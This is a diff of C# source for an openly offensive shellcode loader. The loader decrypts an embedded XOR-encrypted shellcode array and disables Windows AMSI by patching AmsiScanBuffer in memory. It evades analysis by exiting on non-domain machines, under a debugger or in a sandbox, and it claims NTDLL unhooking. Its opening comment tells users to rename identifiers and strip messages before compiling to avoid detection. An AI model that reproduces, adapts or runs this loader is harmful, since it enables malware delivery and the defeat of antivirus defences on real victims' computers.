@@ -1,5 +1,5 @@
 /* Important notes: 
-- This version is voluntary not obfuscated. Class/function/variable names should be changed and all comments must be deleted or modified before compiling this file.
+- This version is voluntary not obfuscated. Namespace/Class/function/variable names should be changed and all comments and console output messages must be deleted or modified before compiling this file.
 - Your shellcode must be in C# format and then encrypted using XOR cipher. Obviously, the XOR key must be replaced in this file with the one you used.
 */
 using System;
@@ -12,7 +12,7 @@ using System.Threading.Tasks;
 
 namespace CsharpShellCodeLoader
 {
-    class SuperProgram
+    class Program
     {
         private static Object Locate_Image_Export_Directory(IntPtr BaseAddress)
         {
@@ -54,7 +54,6 @@ namespace CsharpShellCodeLoader
                     UInt32 RVA_AddressOfFunctions_single = (UInt32)Marshal.ReadInt32(RVA_AddressOfFunctions, 4 * RVA_AddressOfNameOrdinals_single);
                     IntPtr REAL_Func_Address = (IntPtr)(BaseAddress.ToInt64() + RVA_AddressOfFunctions_single);
                     IntPtr FunctionAddress = REAL_Func_Address;
-                    //Console.WriteLine("-- " + FuncName_temp + " Address : " + REAL_Func_Address);
                     return FunctionAddress;
                 }
             }
@@ -399,19 +398,17 @@ namespace CsharpShellCodeLoader
             byte[] Super = new byte[66559] {
             0xac, 0xb2, 0x73, 0x1c, 0xb2, 0x79, 0x1e, 0x0a, 0xb2, 0x79, 0x16, 0xda, 0x12, 0xf5, 0xfa,
             <...SNIP...>
-            0xfa, 0xfa, 0xfa, 0xfa
             };
 			
             //Decrypt the shellcode
             for (int i = 0; i < Super.Length; i++)
             {
-	    //Edit with your XOR key
+	    	//Edit with your XOR key
              Super[i] = (byte)((uint)Super[i] ^ 0xfa);
             }
- 
-	    Console.WriteLine("[+] She11cOde successfully loaded (with NTD11 unh00king)");
             uint ntstats = InvokeSuperCode(Super);
             return ntstats;
+			Console.WriteLine("[+] Shellcode successfully loaded (with NTDLL unhooking)");
         }
 
         [DllImport("kernel32.dll")]
@@ -435,28 +432,21 @@ namespace CsharpShellCodeLoader
         {
             Marshal.Copy(Patch, 0, Address, 6);
         }
-
-        public static void SuperByposs()
+		//A-M-S-I bypass
+        public static void AMSIPatching()
         {
-            //add super comment
             string encodedlibname = Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
-            //Console.WriteLine(encodedlibname);
             IntPtr Lib1 = LoadLibrary(encodedlibname);
-            //add super comment
-            IntPtr Add1 = GetProcAddress(Lib1, "Am" + "s" + "i" + "Sc" + "an" + "Bu" + "ffe" + "r");//add super comment
-            //add super comment
+            IntPtr Add1 = GetProcAddress(Lib1, "Am" + "s" + "i" + "Sc" + "an" + "Bu" + "ffe" + "r");
             uint pi;
-            //add super comment
-            VirtualProtect(Add1, (UIntPtr)5, 0x40, out pi);//add super comment
-            //add super comment
-            Byte[] SuperPitch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };//add super comment
-            //add super comment
-            supercopy(SuperPitch, Add1);//add super comment
+            VirtualProtect(Add1, (UIntPtr)5, 0x40, out pi);
+            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            supercopy(Patch, Add1);
         }
 
         static void Main(string[] args)
         {
-            Console.WriteLine("** C# ShellC0de L0ader **");
+            Console.WriteLine("***** C# Shellcode Loader *****");
             // Defense evasion: Exit the program if it is running on a computer that is not joined to a domain
             if (string.Equals("WORKGROUP", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
             {
@@ -470,7 +460,7 @@ namespace CsharpShellCodeLoader
             {
                 return;
             }
-            // Defense evasion:  Exit the program if a debugger is attached
+            // Defense evasion: Exit the program if a debugger is attached
             if (System.Diagnostics.Debugger.IsAttached)
             {
                 return;
@@ -481,19 +471,18 @@ namespace CsharpShellCodeLoader
             {
                 return;
             }
-            Console.WriteLine("[+] Sucessfully passed sandb0x checks");
+            Console.WriteLine("[+] Sucessfully passed sandbox checks");
 
-            // Defense evasion: Try to bypass 'A-'M-'S-'I-'
-            SuperByposs();
-	    Console.WriteLine("[+] Successfully bypassed A-M-S-I");
+            // Defense evasion: Bypass 'A-'M-'S-'I-'
+            AMSIPatching();
+	    	Console.WriteLine("[+] Successfully bypassed A-M-S-I");
 
-	   // Load the She11cOde
+	   		// Load the shellcode (with NTDLL unhooking)
             uint ntstatus = InvokeSuperMain();
             if (ntstatus != 0)
             {
                 Console.WriteLine("Errors");
             }
-
         }
     }
 }
